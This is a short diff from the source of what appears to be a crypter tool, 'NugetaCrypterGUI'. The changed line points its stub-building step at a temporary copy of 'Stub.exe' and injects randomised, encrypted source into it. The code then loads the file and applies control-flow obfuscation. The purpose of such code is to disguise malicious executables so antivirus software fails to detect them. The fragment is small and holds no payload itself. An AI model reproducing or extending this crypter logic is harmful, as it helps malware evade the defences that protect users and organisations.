@@ -31,7 +31,7 @@ namespace NugetaCrypterGUI.Forms.SubForms
             else
             {
                 File.Copy(System.IO.Path.GetTempPath() + "Stub.exe", System.IO.Path.GetTempPath() + "tmp.exe");
-                Build.Build.AddCode("stub.exe", Randomize.Randomize.SourceEncrypt().Item1, Randomize.Randomize.SourceEncrypt().Item2, Randomize.Randomize.SourceEncrypt().Item5, Randomize.Randomize.SourceEncrypt().Item6, Randomize.Randomize.SourceEncrypt().Item7);
+                Build.Build.AddCode(System.IO.Path.GetTempPath() + "tmp.exe", Randomize.Randomize.SourceEncrypt().Item1, Randomize.Randomize.SourceEncrypt().Item2, Randomize.Randomize.SourceEncrypt().Item5, Randomize.Randomize.SourceEncrypt().Item6, Randomize.Randomize.SourceEncrypt().Item7);
                 using (ModuleDefMD mod = ModuleDefMD.Load(System.IO.Path.GetTempPath() + "tmp.exe"))
                 {
                     Obfuscation.ControlFlowObfuscation.Execute(mod);
